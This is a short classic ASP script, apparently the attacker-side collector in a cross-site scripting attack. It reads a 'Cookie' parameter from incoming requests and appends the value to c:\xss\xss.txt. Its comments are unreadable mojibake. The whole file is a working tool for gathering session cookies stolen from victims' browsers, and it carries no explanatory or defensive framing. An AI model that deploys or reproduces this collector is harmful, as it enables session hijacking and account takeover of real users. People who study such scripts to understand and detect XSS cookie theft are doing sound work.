<%
cookie=request("Cookie")  '��Ű�� �ޱ�

Set fs = Server.CreateObject("Scripting.FileSystemObject")
	if fs.fileexists("c:\xss\xss.txt") then
	else
		fs.createtextfile "c:\xss\xss.txt", true
	end if

Set objFile = fs.OpenTextFile("C:\xss\xss.txt",2, TRUE, 0)   '���Ͼ���
objFile.writeLine("--------------------------------------------------------------")
objFile.writeLine(Cookie)
objFile.close
%>